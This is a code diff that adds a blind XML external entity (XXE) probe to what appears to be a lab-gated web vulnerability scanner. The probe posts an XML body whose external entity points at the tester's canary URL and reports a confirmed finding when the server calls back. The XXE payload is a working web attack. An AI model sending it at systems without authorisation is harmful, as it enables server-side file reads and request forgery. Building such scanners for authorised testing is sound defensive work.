@@ -385,12 +385,55 @@ def blind_xss_oob(points: list[Point], lab: LabContext, canary: OOBCanary,
         wait_timeout=wait_timeout)
 
 
+_XXE_BODY = (
+    '<?xml version="1.0" encoding="UTF-8"?>\n'
+    '<!DOCTYPE celsius [<!ENTITY xxe SYSTEM "{url}">]>\n'
+    '<celsius>&xxe;</celsius>'
+)
+
+
+def xxe_oob(points: list[Point], lab: LabContext, canary: OOBCanary,
+            *, wait_timeout: float = 3.0) -> list[Finding]:
+    """Blind XML external entity: POST an XML document whose external entity points
+    at a unique canary URL. If the server's XML parser resolves it (a callback), XXE
+    is confirmed — deterministic, no error/response needed.
+
+    XXE is about parsing an XML *body*, so this probes each distinct endpoint URL
+    once with an XML POST (not per-param). Endpoints that don't parse XML simply
+    never call back — no false positives, just a wasted request."""
+    out: list[Finding] = []
+    seen: set[str] = set()
+    for pt in points:
+        if pt.url in seen:
+            continue
+        seen.add(pt.url)
+        ok, _why = lab.can_send()
+        if not ok:
+            return out
+        token = canary.new_token()
+        body = _XXE_BODY.format(url=canary.url_for(token)).encode()
+        lab.send(pt.url, method="POST", purpose="xxe-oob", payload=True,
+                 raw_body=body, headers={"Content-Type": "application/xml"})
+        if not canary.wait_for_hit(token, timeout=wait_timeout):
+            continue
+        src = (canary.hits(token)[0].src_ip if canary.hits(token) else "?")
+        out.append(_confirm(
+            "XML external entity (XXE) confirmed — out-of-band", Severity.CRITICAL,
+            pt, "(xml body)", "oob-xxe-entity",
+            "An XML external entity in the request body caused the server's XML parser "
+            "to fetch a unique canary URL — proving XXE (server-side file read / SSRF, "
+            "and potential RCE depending on the parser).",
+            f"out-of-band callback received from {src}"))
+    return out
+
+
 # Maps a config/CLI OOB probe name to its verifier — the plugin runs the enabled
 # subset under one shared canary.
 OOB_PROBES = {
     "ssrf": ssrf_oob,
     "rce": command_injection_oob,
     "blind-xss": blind_xss_oob,
+    "xxe": xxe_oob,
 }
 
 
